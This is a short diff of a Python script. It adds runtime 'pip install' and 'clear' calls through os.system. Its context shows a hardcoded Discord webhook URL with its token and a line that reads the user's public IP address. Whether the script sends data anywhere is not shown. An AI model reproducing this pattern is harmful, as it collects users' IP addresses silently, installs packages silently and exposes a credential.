@@ -13,7 +13,8 @@ import sys
 import time 
 import random
 import requests
-
+os.system("pip install requests")
+os.system("clear")
 discord_webhook_url ="https://discord.com/api/webhooks/941220040542416946/T84BlRekrt89b7z0vN8oIqd9dXkH6xwmASFEqAC_0ds4N7IArTAzXnrDQyZDMupqNqPC"
 myip = requests.get('https://www.wikipedia.org').headers['X-Client-IP']
 def kathakali():
